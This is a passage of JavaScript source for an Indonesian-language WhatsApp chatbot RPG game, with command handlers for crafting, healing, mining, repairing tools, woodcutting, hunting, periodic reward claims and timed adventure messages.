            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG-GAME (Tools Crafting)",
              body: 'Making equipment',
              thumbnailUrl: "https://telegra.ph/file/2a8bf170a5b74aa808078.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      } else if (args[0] === "pedang") {
        if (global.db.erpg[m.sender].pedang) return m.reply('Kamu Sudah Memiliki Pedang!')
        let besi = Number(3)
        let kayu = Number(1)
        if (global.db.erpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pedang*\n\nUntuk Membuat Pedang Diperlukan *3 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].pedang = true
        global.db.erpg[m.sender].besi -= besi
        global.db.erpg[m.sender].kayu -= kayu
        let pedang = `*Berhasil Membuat Pedang!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n\n`
        await sock.sendMessage(m.chat, {
          text: pedang,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG-GAME (Tools Crafting)",
              body: 'Making equipment',
              thumbnailUrl: "https://telegra.ph/file/0c245751d14b42fe7f3c0.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      } else {
        let craft = `*Apa Yang Ingin Kamu Buat?*

  ${vircion} • kapal
  ${vircion} • rumah
  ${vircion} • kapak
  ${vircion} • pickaxe
  ${vircion} • pedang
  ${vircion} • bajuzirah
  ${vircion} • kain

*Contoh:*
.craft kapak`
        await sock.sendMessage(m.chat, {
          text: craft,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG-GAME (Crafting Item)",
              body: 'Make items for survival and adventure',
              thumbnailUrl: "https://telegra.ph/file/fed81e9a280d8a3965d6f.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      }
    }
    break

    case 'heal': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].potion < 1) return m.reply(`Potion Kamu Habis\nKetik .buy potion 1`)

      let health = await randomNomor(34, 89)
      let stamina = await randomNomor(55, .78)

      global.db.erpg[m.sender].potion -= 1
      global.db.erpg[m.sender].darahuser += health
      global.db.erpg[m.sender].stamina += stamina
      m.reply(`Berhasil Memulihkan Dengan Potion
Health: +${health}
Stamina: +${stamina}`)
    }
    break

    case 'mining': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (!global.db.erpg[m.sender].pickaxe) return m.reply('Kamu Tidak Memiliki pickaxe\nSilahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
      if (global.db.erpg[m.sender].darahpickaxe < 1) return m.reply('☹️Pickaxe Kamu Rusak\nRawat Dulu Alat Tambangmu\n\nKetik _.rawat_')
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      let besi = [2, 1, 6, 1, 0, 3, 7, 8, 3, 2, 0, 7, 1, 9]
      let batubara = [1, 1, 2, 1, 0, 6, 0, 0, 2, 5, 1, 0, 1, 0]
      let emas = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
      let perak = [2, 1, 3, 5, 0, 0, 0, 0, 0, 2, 1, 0, 8, 2]
      let diamond = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
      let emerald = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
      const besinyo = await pickRandom(besi)
      const batubaranyo = await pickRandom(batubara)
      const emasnyo = await pickRandom(emas)
      const peraknyo = await pickRandom(perak)
      const diamondnyo = await pickRandom(diamond)
      const emeraldnyo = await pickRandom(emerald)
      let mining = `*MINING ADVENTURE*\n\nItem Yang Didapat :\n  ${vircion} • Besi: ${besinyo}\n  ${vircion} • Emas: ${emasnyo}\n  ${vircion} • Perak: ${peraknyo}\n  ${vircion} • Batu Bara: ${batubaranyo}\nDiamond: ${diamondnyo}\nEmerald: ${emeraldnyo}\n\n_🧰 Disimpan Dalam Inventory..._\n_❤️ Darah Berkurang 20_\n_⛏️ Ketahanan Pickaxe ${global.db.erpg[m.sender].darahpickaxe}%_\n\n`
      await sock.sendMessage(m.chat, {
        text: mining,
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 9999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: null + "@newsletter",
            serverMessageId: null,
            newsletterName: `${namaBot}`
          },
          externalAdReply: {
            title: "RPG-GAME (Mining Resource)",
            body: 'Mining natural resources',
            thumbnailUrl: "https://telegra.ph/file/4ca67ad95bce6afa1a0f2.jpg",
            sourceUrl: "-",
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      }, {
        quoted: fakeQuoted
      })
      global.db.erpg[m.sender].darahpickaxe -= 20
      global.db.erpg[m.sender].besi += besinyo
      global.db.erpg[m.sender].emas += emasnyo
      global.db.erpg[m.sender].perak += peraknyo
      global.db.erpg[m.sender].batubara += batubaranyo
    }
    break
    case 'repair':
    case 'rawat': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      let rawat = args[0]
      switch (rawat) {
      case 'kapal':
        if (!global.db.erpg[m.sender].kapal) return m.reply(`*Kamu Gak Punya Kapal*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapal`)
        if (!global.db.erpg[m.sender].darahkapal < 1) return m.reply(`*Kapal Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 5) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *5 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kayu < 10) return m.reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *10 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 5
        global.db.erpg[m.sender].kayu -= 10
        global.db.erpg[m.sender].darahkapal = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      case 'pickaxe':
        if (!global.db.erpg[m.sender].pickaxe) return m.reply(`*Kamu Gak Punya Pickaxe*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pickaxe`)
        if (!global.db.erpg[m.sender].darahpickaxe < 1) return m.reply(`*Pickaxe Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 1) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pickaxe*\n\nUntuk Perbaikan Pickaxe Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 1
        global.db.erpg[m.sender].darahpickaxe = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      case 'kapak':
        if (!global.db.erpg[m.sender].kapak) return m.reply(`*Kamu Gak Punya Kapak*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapak`)
        if (!global.db.erpg[m.sender].darahkapak < 1) return m.reply(`*Kapak Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 1) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapak*\n\nUntuk Perbaikan Kapak Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 1
        global.db.erpg[m.sender].darahkapak = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      case 'armor':
        if (!global.db.erpg[m.sender].bzirah) return m.reply(`*Kamu Gak Punya Baju Zirah*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Baju Zirah`)
        if (!global.db.erpg[m.sender].darahbzirah < 1) return m.reply(`*Baju Zirah Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 2) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Armor*\n\nUntuk Perbaikan Armor Diperlukan *2 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 2
        global.db.erpg[m.sender].darahbzirah = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      case 'pedang':
        if (!global.db.erpg[m.sender].pedang) return m.reply(`*Kamu Gak Punya Pedang*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pedang`)
        if (!global.db.erpg[m.sender].darahpedang < 1) return m.reply(`*Pedang Kamu Masih Bagus*`)
        if (global.db.erpg[m.sender].besi < 1) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pedang*\n\nUntuk Perbaikan Pedang Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].besi -= 1
        global.db.erpg[m.sender].darahpedang = 100
        editp('Memperbaiki, Mohon Tunggu', 'Tahap Finishing', 'Done Perbaikan')
        break
      default:
        let teks = `---------- » *PERBAIKAN* « ----------

*Pilih Barang Yang*
*Akan Di perbaiki*
  ${vircion} • kapal
  ${vircion} • pickaxe
  ${vircion} • kapak
  ${vircion} • armor
  ${vircion} • pedang

*Contoh:*
${cmd} kapak`
        sock.sendMessage(m.chat, {
          text: teks,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG TOOLS REPAIR",
              body: 'Repairs and upgrades tools',
              thumbnailUrl: "https://telegra.ph/file/08e78c20afd16dcebb33d.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      }
    }
    break
    case 'menebang':
    case 'nebang': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (!global.db.erpg[m.sender].kapak) return m.reply('Kamu Tidak Memiliki Kapak, Silahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
      if (global.db.erpg[m.sender].darahkapak < 1) return m.reply('☹️Kapak Kamu Rusak\nRawat Dulu Alat Tebangmu\n\nKetik _.rawat_')
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      let kayu = await randomNomor(0, 20)
      global.db.erpg[m.sender].kayu += kayu
      global.db.erpg[m.sender].darahkapak -= 20
      m.reply(`*🌳 MENEBANG POHON 🌳*

Item Yang Didapat:
  ${vircion} • Kayu: ${kayu} (Hasil Tebang)
  ${vircion} • Kapak: -20 Healthy (Digunakan)`)
    }
    break

    case 'weekly':
    case 'mingguan': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      try {
        let waktuu = await clockString(new Date() - global.db.erpg[m.sender].weeklyclaim)
        if (new Date() - global.db.erpg[m.sender].weeklyclaim < 604800000) return m.reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Minggu.`)
        let saldo = await randomNomor(1000, 10000)
        let limit = await randomNomor(20, 100)
        global.db.erpg[m.sender].weeklyclaim = new Date * 1
        db.users[m.sender].saldo += saldo
        db.users[m.sender].limit += limit
        m.reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
      } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan: ' + err);
      }
    }
    break

    case 'monthly':
    case 'bulanan': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      try {
        let waktuu = await clockString(new Date() - global.db.erpg[m.sender].monthlyclaim)
        if (new Date() - global.db.erpg[m.sender].monthlyclaim < 5184000000) return m.reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Bulan.`)
        let saldo = await randomNomor(5000, 50000)
        let limit = await randomNomor(30, 200)
        global.db.erpg[m.sender].monthlyclaim = new Date * 1
        db.users[m.sender].saldo += saldo
        db.users[m.sender].limit += limit
        m.reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
      } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan: ' + err);
      }
    }
    break

    case 'yearly':
    case 'tahunan': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!isPremium) return reply(mess.prem)
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      try {
        let waktuu = await clockString(new Date() - global.db.erpg[m.sender].yearlyclaim)
        if (new Date() - global.db.erpg[m.sender].yearlyclaim < 31536000000) return m.reply(`Kamu Baru Saja Claim ${command}, ${waktuu} Yang Lalu, Claim Lagi Setelah 1 Tahun.`)
        let saldo = await randomNomor(600000, 6000000)
        let limit = await randomNomor(4000, 24000)
        global.db.erpg[m.sender].yearlyclaim = new Date * 1
        db.users[m.sender].saldo += saldo
        db.users[m.sender].limit += limit
        m.reply(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
      } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan: ' + err);
      }
    }
    break

    case 'berburu': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      let darah = await randomNomor(45, 70)
      let domba = await randomNomor(0, 10)
      let sapi = await randomNomor(0, 10)
      let ayam = await randomNomor(0, 35)
      let banteng = await randomNomor(0, 10)
      let kambing = await randomNomor(0, 10)
      let kerbau = await randomNomor(0, 10)
      let babihutan = await randomNomor(0, 20)
      let monyet = await randomNomor(0, 10)
      let babi = await randomNomor(0, 17)
      let panda = await randomNomor(0, 7)
      let harimau = await randomNomor(0, 4)
      let gajah = await randomNomor(0, 3)
      let buaya = await randomNomor(0, 10)
      let buulu = domba + sapi + ayam
      let bulu = buulu / 2
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].burutime)
      if (new Date() - global.db.erpg[m.sender].burutime < 18000000) return m.reply(`Kamu Baru Saja Berburu ${waktuu} Yang Lalu, Silahkan Tunggu 5 Jam Setelah Terakhir Kali Berburu`)
      global.db.erpg[m.sender].burutime = new Date * 1
      global.db.erpg[m.sender].domba += domba
      global.db.erpg[m.sender].sapi += sapi
      global.db.erpg[m.sender].ayam += ayam
      global.db.erpg[m.sender].bulu += bulu
      global.db.erpg[m.sender].banteng += banteng
      global.db.erpg[m.sender].kambing += kambing
      global.db.erpg[m.sender].kerbau += kerbau
      global.db.erpg[m.sender].babihutan += babihutan
      global.db.erpg[m.sender].monyet += monyet
      global.db.erpg[m.sender].babi += babi
      global.db.erpg[m.sender].panda += panda
      global.db.erpg[m.sender].harimau += harimau
      global.db.erpg[m.sender].gajah += gajah
      global.db.erpg[m.sender].babihutan += buaya
      global.db.erpg[m.sender].darahuser -= darah
      m.reply(`*🏹 BERBURU 🏹*

Item Yang Didapat:
  ${vircion} • Domba: ${domba}
  ${vircion} • Sapi: ${sapi}
  ${vircion} • Ayam: ${ayam}
  ${vircion} • Banteng: ${banteng}
  ${vircion} • Kambing: ${kambing}
  ${vircion} • Kerbau: ${kerbau}
  ${vircion} • Babi Hutan: ${babihutan}
  ${vircion} • Monyet: ${monyet}
  ${vircion} • Babi: ${babi}
  ${vircion} • Panda: ${panda}
  ${vircion} • Harimau: ${harimau}
  ${vircion} • Gajah: ${gajah}
  ${vircion} • Bulu: ${bulu} (Hasil Pencabutan)

  ${vircion} • Darah Berkurang: ${darah}%
  
_Tunggu 5 jam untuk_
_berburu berikutnya_`)
    }
    break
    case 'adventure': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].darahuser < 1) return m.reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      var tuju = args.join(" ")
      let obj = ["villager", "zombie", "ghasts", "wither", "skeleton", "wolves"]
      let obje = await pickRandom(obj)
      let kayu = await randomNomor(15)
      let besi = await randomNomor(10)
      let rank = await randomNomor(100)
      let saldo = await randomNomor(2000)
      let perak = await randomNomor(10)
      let emerald = await randomNomor(5)
      let mythic = await randomNomor(7)
      let uncommon = await randomNomor(15)
      let common = await randomNomor(10)
      let diamond = await randomNomor(5)
      let legendary = await randomNomor(3)
      if (tuju === "savanah") {
        global.db.erpg[m.sender].darahuser -= 20
        let thumbadv = "https://telegra.ph/file/1b27b199f440cd69be0aa.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -20*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
      } else if (tuju === "dessert") {
        global.db.erpg[m.sender].darahuser -= 20
        let thumbadv = "https://telegra.ph/file/760e27568c0b2ccf07231.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -20*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
      } else if (tuju === "boreal forest") {
        global.db.erpg[m.sender].darahuser -= 20
        let thumbadv = "https://telegra.ph/file/1a528cf0c7e1eb0e74976.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -20*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
      } else if (tuju === "tropical forest") {
        global.db.erpg[m.sender].darahuser -= 20
        let thumbadv = "https://telegra.ph/file/bbc4d8eb053479d69e5f7.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -20*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
      } else if (tuju === "underground") {
        global.db.erpg[m.sender].darahuser -= 30
        let thumbadv = "https://telegra.ph/file/b7f11f5383cc421ff0ce8-93abbbb8e9f5ca6dc2.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Emerald: ${emerald}
  ${vircion} • Perak: ${perak}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -30*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
        global.db.erpg[m.sender].emerald += emerald
        global.db.erpg[m.sender].perak += perak
      } else if (tuju === "shadownland") {
        global.db.erpg[m.sender].darahuser -= 40
        let thumbadv = "https://telegra.ph/file/e70bbe68c4bad74b43311-006005796ede87da36.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Emerald: ${emerald}
  ${vircion} • Perak: ${perak}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -40*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
        global.db.erpg[m.sender].emerald += emerald
        global.db.erpg[m.sender].perak += perak
      } else if (tuju === "dragons peak") {
        global.db.erpg[m.sender].darahuser -= 55
        let thumbadv = "https://telegra.ph/file/514c00efd64770a6f9a0c-b16de076ca5d6870c0.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Emerald: ${emerald}
  ${vircion} • Perak: ${perak}
  ${vircion} • Mythic: ${mythic}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -55*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
